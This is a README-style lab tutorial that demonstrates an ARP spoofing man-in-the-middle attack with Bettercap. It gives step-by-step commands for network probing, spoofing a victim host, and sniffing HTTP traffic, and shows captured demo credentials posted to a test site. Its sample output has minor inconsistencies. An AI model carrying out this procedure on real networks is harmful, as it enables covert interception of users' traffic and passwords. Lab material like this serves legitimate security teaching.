# ARP-MITM-Bettercap
> ⚠️ **Disclaimer**: This project is for educational purposes only. Do **not** perform these actions on networks you do not own or have explicit permission to test. Unauthorized access is illegal.

## LAB SET-UP
### 💻 Attacker Machine

**OS**: Kali Linux 2024.1  

**Tool Used**: Bettercap  

**IP Address**: 192.168.1.5  

**Role**: Perform ARP spoofing, sniff HTTP traffic

### 🖥️ Victim Machine

**OS**: Ubuntu or Windows 10   

**Browser**: Firefox / Chrome  

**IP Address**: 192.168.1.10  

**Role**: Target of the attack, visiting HTTP websites

### 🌐 Network Setup

**Type**: Bridged Adapter (VirtualBox)  

**Interface**: `eth0` (for attacker)  

**Same Local Network**: Yes ✅   

  Check your network  interface:  
  ```bash
  ip a
  ```
  Check your Default gateway:(victim)
  ```bash
  ip route
  ```
Install **Bettercap** if not already installed:

```bash
 sudo apt update
 sudo apt install bettercap
 ```

1. **Start Bettercap:**
    ```bash
    sudo bettercap -iface eth0
    ```

2. **Scan Network:**
    ```bash
    net.probe on
    ```
    ``` output
    192.168.1.0/24 > 192.168.1.5  » net.probe on
    [10:09:18] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
    192.168.1.0/24 > 192.168.1.5  » [10:09:18] [sys.log] [inf] net.probe probing 256 addresses on 192.168.1.0/24
    192.168.1.0/24 > 192.168.1.5  » [10:09:18] [endpoint.new] endpoint fe80::xxxx:xxxx:xxxx:xxxx detected as **AA:BB:CC:DD:EE:01** (Generic Device Vendor)
    192.168.1.0/24 > 192.168.1.5  » [10:09:18] [endpoint.new] endpoint 192.168.1.10 detected as **AA:BB:CC:DD:EE:02** (Generic Device Vendor)
```

net.show
```
```output
192.168.1.0/24 > 192.168.1.5  » net.show

┌────────────────────────────┬────────────────────┬─────────────────┬──────────────────────────────────────────────┬───────┬───────┬──────────┐
│           IP ▴             │        MAC         │      Name       │                    Vendor                    │ Sent  │ Recvd │   Seen   │
├────────────────────────────┼────────────────────┼─────────────────┼──────────────────────────────────────────────┼───────┼───────┼──────────┤
│ 192.168.1.5                │ AA:BB:CC:11:22:33   │ eth0            │ PCS Systemtechnik GmbH                       │ 0 B   │ 0 B   │ 10:09:11 │
│ 192.168.1.13               │ DD:EE:FF:44:55:66   │ gateway         │                                              │ 695 B │ 477 B │ 10:09:11 │
│                            │                    │                 │                                              │       │       │          │
│ fe80::xxxx:xxxx:xxxx:xxxx  │ FF:AA:CC:77:88:99   │ LAPTOP-USER     │ CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD. │ 0 B   │ 0 B   │ 10:09:20 │
│ 192.168.1.10               │ 11:22:33:44:55:66   │                 │ PCS Systemtechnik GmbH                       │ 120 B │ 92 B  │ 10:09:20 │
└────────────────────────────┴────────────────────┴─────────────────┴──────────────────────────────────────────────┴───────┴───────┴──────────┘
```

3. **Set Victim IP:**
    ```bash
    set arp.spoof.targets 192.168.1.10
    ```

4. **Launch Attack:**
    ```bash
    arp.spoof on
    http.proxy on
    net.sniff on
    ```

5. **Ask the victim to visit a non-HTTPS site** (for demonstration):
    ```
    http://testphp.vulnweb.com/login.php
    ```

6. **Captured Output:**
    ```OUTPUT
    192.168.1.0/24 > 192.168.1.5  » [10:10:36] [net.sniff.http.request] http 192.168.1.10 POST testphp.vulnweb.com/userinfo.php                                                                                              POST /userinfo.php HTTP/1.1
          Host: testphp.vulnweb.com
          Origin: http://testphp.vulnweb.com
          Connection: keep-alive
          Upgrade-Insecure-Requests: 1
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
          Accept-Encoding: gzip, deflate
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 23
          Priority: u=0, i
          User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0
          Accept-Language: en-US,en;q=0.5
          Referer: http://testphp.vulnweb.com/login.php

          uname=demoUser&pass=demoPass

    ```


